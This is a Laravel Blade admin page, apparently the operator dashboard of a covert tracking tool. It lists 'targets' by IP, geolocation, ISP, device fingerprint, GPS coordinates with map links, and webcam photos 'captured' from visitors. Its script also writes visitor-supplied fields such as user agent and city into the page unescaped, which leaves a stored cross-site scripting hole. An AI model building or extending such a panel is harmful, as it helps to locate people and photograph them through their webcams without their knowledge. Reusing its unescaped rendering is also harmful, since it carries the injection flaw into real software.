@extends('layouts.admin')

@section('title', 'Target Logs')

@section('content')
<div class="space-y-6 max-w-7xl mx-auto">

    <!-- Top Header -->
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div>
            <h1 class="text-xl sm:text-2xl font-bold text-white tracking-tight">Target Intelligence Logs</h1>
            <p class="text-zinc-400 text-xs sm:text-sm mt-0.5">Detailed visitor telemetry, device fingerprints, and geolocation data.</p>
        </div>

        <div class="flex items-center gap-2">
            <form action="{{ route('admin.logs.clear') }}" method="POST" onsubmit="return confirm('Are you sure you want to delete ALL telemetry logs and snapshots? This action cannot be undone.');">
                @csrf
                <button type="submit" class="px-3.5 py-2 text-xs font-medium bg-red-950/50 hover:bg-red-900/80 text-red-300 border border-red-800/50 rounded-xl transition flex items-center gap-1.5 shadow-sm">
                    <i class="fa-solid fa-trash text-xs"></i>
                    <span>Clear All Logs</span>
                </button>
            </form>
        </div>
    </div>

    <!-- Filters & Search -->
    <div class="p-3.5 sm:p-4 bg-zinc-900 rounded-2xl border border-zinc-800">
        <form action="{{ route('admin.logs') }}" method="GET" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5 sm:gap-3">
            <div>
                <input type="text" name="search" value="{{ request('search') }}" placeholder="Search IP, City, ISP, UUID..."
                       class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs text-white placeholder-zinc-500 focus:outline-none focus:border-pink-500">
            </div>

            <div>
                <select name="filter_gps" class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs text-zinc-300 focus:outline-none focus:border-pink-500">
                    <option value="">-- All GPS Status --</option>
                    <option value="yes" {{ request('filter_gps') === 'yes' ? 'selected' : '' }}>GPS Captured</option>
                    <option value="no" {{ request('filter_gps') === 'no' ? 'selected' : '' }}>No GPS / Denied</option>
                </select>
            </div>

            <div>
                <select name="filter_cam" class="w-full px-3.5 py-2.5 bg-zinc-950 border border-zinc-800 rounded-xl text-xs text-zinc-300 focus:outline-none focus:border-pink-500">
                    <option value="">-- All Camera Status --</option>
                    <option value="yes" {{ request('filter_cam') === 'yes' ? 'selected' : '' }}>Has Webcam Photos</option>
                </select>
            </div>

            <div class="flex gap-2">
                <button type="submit" class="flex-1 py-2.5 px-4 bg-zinc-800 hover:bg-zinc-700 text-white rounded-xl text-xs font-medium transition flex items-center justify-center gap-1.5">
                    <i class="fa-solid fa-filter text-pink-400"></i> Filter
                </button>
                @if(request()->hasAny(['search', 'filter_gps', 'filter_cam']))
                    <a href="{{ route('admin.logs') }}" class="py-2.5 px-3 bg-zinc-800/50 hover:bg-zinc-800 text-zinc-400 rounded-xl text-xs flex items-center justify-center transition" title="Reset Filters">
                        <i class="fa-solid fa-rotate-left"></i>
                    </a>
                @endif
            </div>
        </form>
    </div>

    <!-- Logs Container -->
    <div class="rounded-2xl bg-zinc-900 border border-zinc-800 overflow-hidden shadow-xl">
        
        <!-- Desktop Table View (Hidden on mobile) -->
        <div class="hidden md:block overflow-x-auto scrollbar-slim touch-scroll">
            <table class="w-full text-left text-xs">
                <thead class="bg-zinc-950/80 text-zinc-400 uppercase font-mono text-[10px] tracking-wider border-b border-zinc-800">
                    <tr>
                        <th class="p-4">UUID / Target IP</th>
                        <th class="p-4">Location (GeoIP)</th>
                        <th class="p-4">Hardware & Specs</th>
                        <th class="p-4">GPS Coordinates</th>
                        <th class="p-4">Webcam</th>
                        <th class="p-4">Captured At</th>
                        <th class="p-4 text-right">Actions</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-zinc-800/60 text-zinc-300">
                    @forelse($logs as $log)
                        <tr class="hover:bg-zinc-850/60 transition">
                            <td class="p-4 font-mono">
                                <div class="font-bold text-white text-sm">{{ $log->ip }}</div>
                                <div class="text-[10px] text-pink-400/80 truncate max-w-[140px]" title="{{ $log->uuid }}">{{ $log->uuid }}</div>
                            </td>

                            <td class="p-4">
                                <div class="font-medium text-zinc-200">{{ $log->city ?? 'Unknown' }}, {{ $log->country ?? 'Unknown' }}</div>
                                <div class="text-[11px] text-zinc-400">{{ $log->region_name ?? '' }} ({{ $log->country_code ?? '' }})</div>
                                <div class="text-[10px] text-zinc-500 truncate max-w-[180px]">{{ $log->isp ?? 'N/A' }}</div>
                            </td>

                            <td class="p-4">
                                <div class="text-zinc-200">{{ $log->platform ?? 'Unknown OS' }}</div>
                                <div class="text-[11px] text-zinc-400">Screen: {{ $log->screen_resolution ?? 'N/A' }}</div>
                                <div class="text-[10px] text-zinc-500">RAM: {{ $log->ram ? $log->ram . 'GB' : 'N/A' }} | Cores: {{ $log->cpu_cores ?? 'N/A' }}</div>
                            </td>

                            <td class="p-4">
                                @if($log->gps_lat && $log->gps_lon)
                                    <div class="space-y-1">
                                        <div class="font-mono text-[11px] text-amber-300">{{ $log->gps_lat }}, {{ $log->gps_lon }}</div>
                                        <a href="https://www.google.com/maps/place/{{ $log->gps_lat }},{{ $log->gps_lon }}" target="_blank"
                                           class="inline-flex items-center px-2 py-0.5 rounded bg-amber-950/60 border border-amber-800/60 text-amber-300 text-[10px] hover:bg-amber-900/60 transition">
                                            <i class="fa-solid fa-map-location mr-1"></i> Google Maps
                                        </a>
                                    </div>
                                @elseif($log->gps_error)
                                    <span class="inline-flex items-center px-2 py-0.5 rounded text-[10px] bg-red-950/40 text-red-400 border border-red-800/40" title="{{ $log->gps_error }}">
                                        Denied / Error
                                    </span>
                                @else
                                    <span class="text-zinc-500 font-mono">-</span>
                                @endif
                            </td>

                            <td class="p-4">
                                @if($log->snapshots->isNotEmpty())
                                    <button onclick="viewSnapshots({{ $log->id }})" class="inline-flex items-center px-2.5 py-1 rounded-md bg-pink-950/60 border border-pink-800/60 text-pink-300 text-xs font-mono hover:bg-pink-900/60 transition">
                                        <i class="fa-solid fa-images mr-1.5"></i> {{ $log->snapshots->count() }} photos
                                    </button>
                                @else
                                    <span class="text-zinc-500 font-mono">0</span>
                                @endif
                            </td>

                            <td class="p-4 font-mono text-zinc-400 text-[11px]">
                                {{ $log->created_at->format('Y-m-d H:i') }}
                            </td>

                            <td class="p-4 text-right">
                                <div class="flex items-center justify-end gap-1.5">
                                    <button onclick="openDetailModal({{ $log->id }})" class="px-2.5 py-1.5 bg-zinc-800 hover:bg-zinc-700 text-zinc-200 rounded-lg text-xs transition" title="Inspect Full Telemetry">
                                        <i class="fa-solid fa-eye"></i>
                                    </button>
                                    <form action="{{ route('admin.logs.delete', $log->id) }}" method="POST" onsubmit="return confirm('Delete this target record?');" class="inline">
                                        @csrf
                                        @method('DELETE')
                                        <button type="submit" class="px-2.5 py-1.5 bg-red-950/40 hover:bg-red-900/60 text-red-400 border border-red-800/40 rounded-lg text-xs transition" title="Delete">
                                            <i class="fa-solid fa-trash-can"></i>
                                        </button>
                                    </form>
                                </div>
                            </td>
                        </tr>
                    @empty
                        <tr>
                            <td colspan="7" class="p-12 text-center text-zinc-500">
                                No logs match the specified search or filter criteria.
                            </td>
                        </tr>
                    @endforelse
                </tbody>
            </table>
        </div>

        <!-- Mobile Card List View (Optimized for Phones) -->
        <div class="md:hidden divide-y divide-zinc-800/60">
            @forelse($logs as $log)
                <div class="p-4 space-y-3 hover:bg-zinc-850/40 transition">
                    <div class="flex items-start justify-between gap-2">
                        <div>
                            <div class="font-bold text-white font-mono text-sm">{{ $log->ip }}</div>
                            <div class="text-xs text-zinc-400">{{ $log->city ?? 'Unknown' }}, {{ $log->country ?? 'Unknown' }}</div>
                        </div>
                        <span class="text-[10px] text-zinc-500 font-mono">{{ $log->created_at->diffForHumans() }}</span>
                    </div>

                    <div class="grid grid-cols-2 gap-2 text-[11px] bg-zinc-950/60 p-2.5 rounded-xl border border-zinc-800/60">
                        <div>
                            <span class="text-zinc-500 block text-[10px]">DEVICE / OS</span>
                            <span class="text-zinc-300 font-medium truncate block">{{ $log->platform ?? 'Unknown' }}</span>
                        </div>
                        <div>
                            <span class="text-zinc-500 block text-[10px]">ISP</span>
                            <span class="text-zinc-300 truncate block">{{ $log->isp ?? 'N/A' }}</span>
                        </div>
                    </div>

                    <div class="flex items-center justify-between gap-2 pt-1">
                        <div>
                            @if($log->gps_lat && $log->gps_lon)
                                <a href="https://www.google.com/maps/place/{{ $log->gps_lat }},{{ $log->gps_lon }}" target="_blank" 
                                   class="text-[11px] text-amber-400 hover:text-amber-300 font-medium flex items-center gap-1">
                                    <i class="fa-solid fa-map-location-dot"></i> Maps
                                </a>
                            @elseif($log->gps_error)
                                <span class="text-[10px] text-red-400">GPS: Denied</span>
                            @else
                                <span class="text-[10px] text-zinc-500">GPS: None</span>
                            @endif
                        </div>

                        <div class="flex items-center gap-2">
                            @if($log->snapshots->isNotEmpty())
                                <button onclick="viewSnapshots({{ $log->id }})" class="px-2.5 py-1 rounded-lg bg-pink-950/60 border border-pink-800/60 text-pink-300 text-[11px] font-mono">
                                    <i class="fa-solid fa-camera mr-1"></i> {{ $log->snapshots->count() }}
                                </button>
                            @endif
                            <button onclick="openDetailModal({{ $log->id }})" class="px-3 py-1 bg-zinc-800 hover:bg-zinc-700 text-zinc-200 rounded-lg text-xs font-medium">
                                Details
                            </button>
                            <form action="{{ route('admin.logs.delete', $log->id) }}" method="POST" onsubmit="return confirm('Delete this target record?');" class="inline">
                                @csrf
                                @method('DELETE')
                                <button type="submit" class="px-2.5 py-1 bg-red-950/40 text-red-400 border border-red-800/40 rounded-lg text-xs">
                                    <i class="fa-solid fa-trash-can"></i>
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            @empty
                <div class="p-8 text-center text-zinc-500 text-xs">
                    No logs match the specified search or filter criteria.
                </div>
            @endforelse
        </div>

        @if($logs->hasPages())
            <div class="p-3.5 sm:p-4 border-t border-zinc-800 bg-zinc-950/50">
                {{ $logs->links() }}
            </div>
        @endif
    </div>

</div>

<!-- Responsive Telemetry Detail Modal -->
<div id="detailModal" class="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm hidden items-center justify-center p-3 sm:p-4">
    <div class="bg-zinc-900 border border-zinc-800 rounded-2xl max-w-2xl w-full p-4 sm:p-6 shadow-2xl space-y-4 max-h-[90vh] overflow-y-auto">
        <div class="flex items-center justify-between border-b border-zinc-800 pb-3">
            <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <i class="fa-solid fa-fingerprint text-pink-500"></i> Target Technical Details
            </h3>
            <button onclick="closeDetailModal()" class="w-8 h-8 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-zinc-400 hover:text-white flex items-center justify-center transition">
                <i class="fa-solid fa-xmark text-sm"></i>
            </button>
        </div>

        <div id="modalContent" class="space-y-4 text-xs font-mono">
            <div class="text-center py-8 text-zinc-500">Loading details...</div>
        </div>
    </div>
</div>

@endsection

@section('scripts')
<script>
function openDetailModal(id) {
    const modal = document.getElementById('detailModal');
    const content = document.getElementById('modalContent');
    modal.classList.remove('hidden');
    modal.classList.add('flex');
    content.innerHTML = '<div class="text-center py-8 text-zinc-500"><i class="fa-solid fa-spinner fa-spin text-xl mb-2 text-pink-500"></i><div>Loading details...</div></div>';

    fetch(`/admin/logs/${id}`)
        .then(r => r.json())
        .then(data => {
            const l = data.log;
            let snapsHtml = '';
            if (data.snapshots && data.snapshots.length > 0) {
                snapsHtml = '<div class="mt-4"><div class="text-zinc-400 font-semibold mb-2 flex items-center gap-1.5"><i class="fa-solid fa-camera text-pink-400"></i> CAPTURED WEBCAM PHOTOS:</div><div class="grid grid-cols-2 sm:grid-cols-3 gap-2">';
                data.snapshots.forEach(s => {
                    snapsHtml += `<a href="${s.url}" target="_blank" class="block aspect-video rounded-lg overflow-hidden border border-zinc-800 bg-black hover:border-pink-500 transition"><img src="${s.url}" class="object-cover h-full w-full hover:scale-105 transition" /></a>`;
                });
                snapsHtml += '</div></div>';
            }

            content.innerHTML = `
                <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 sm:gap-3 text-zinc-300">
                    <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                        <span class="text-zinc-500 block text-[10px]">IP ADDRESS</span>
                        <span class="text-pink-400 font-bold text-sm break-all">${l.ip || 'N/A'}</span>
                    </div>
                    <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                        <span class="text-zinc-500 block text-[10px]">GEO LOCATION</span>
                        <span class="font-medium">${l.city || 'N/A'}, ${l.country || 'N/A'}</span>
                    </div>
                    <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                        <span class="text-zinc-500 block text-[10px]">ISP & ORG</span>
                        <span class="truncate block">${l.isp || 'N/A'}</span>
                    </div>
                    <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                        <span class="text-zinc-500 block text-[10px]">PLATFORM / OS</span>
                        <span class="font-medium">${l.platform || 'N/A'}</span>
                    </div>
                    <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                        <span class="text-zinc-500 block text-[10px]">HARDWARE SPECS</span>
                        <span>RAM: ${l.ram ? l.ram + 'GB' : 'N/A'} | CPU: ${l.cpu_cores || 'N/A'} Cores</span>
                    </div>
                    <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                        <span class="text-zinc-500 block text-[10px]">SCREEN & LANGUAGE</span>
                        <span>${l.screen_resolution || 'N/A'} (${l.browser_language || 'N/A'})</span>
                    </div>
                </div>

                <div class="p-3 bg-zinc-950 rounded-xl border border-zinc-800">
                    <span class="text-zinc-500 block text-[10px] mb-1">USER AGENT</span>
                    <span class="text-[11px] text-zinc-300 break-all leading-relaxed">${l.user_agent || 'N/A'}</span>
                </div>

                ${l.gps_lat ? `
                <div class="p-3 bg-amber-950/30 rounded-xl border border-amber-800/40 space-y-2">
                    <span class="text-amber-400 font-bold block text-[10px] tracking-wider">GPS SATELLITE TELEMETRY</span>
                    <div class="text-amber-200">Lat: ${l.gps_lat}, Lon: ${l.gps_lon} (Accuracy: ${l.gps_accuracy || 'N/A'}m)</div>
                    <div class="flex items-center gap-3 pt-1">
                        <a href="https://www.google.com/maps/place/${l.gps_lat},${l.gps_lon}" target="_blank" class="px-2.5 py-1 bg-amber-950 border border-amber-800 text-amber-300 rounded-lg text-[11px] hover:bg-amber-900 transition flex items-center gap-1">
                            <i class="fa-solid fa-map-location"></i> Google Maps
                        </a>
                        <a href="https://earth.google.com/web/search/${l.gps_lat},${l.gps_lon}" target="_blank" class="px-2.5 py-1 bg-zinc-800 text-zinc-300 rounded-lg text-[11px] hover:bg-zinc-700 transition flex items-center gap-1">
                            <i class="fa-solid fa-globe"></i> Google Earth
                        </a>
                    </div>
                </div>` : ''}

                ${snapsHtml}
            `;
        });
}

function viewSnapshots(id) {
    openDetailModal(id);
}

function closeDetailModal() {
    const modal = document.getElementById('detailModal');
    modal.classList.add('hidden');
    modal.classList.remove('flex');
}
</script>
@endsection
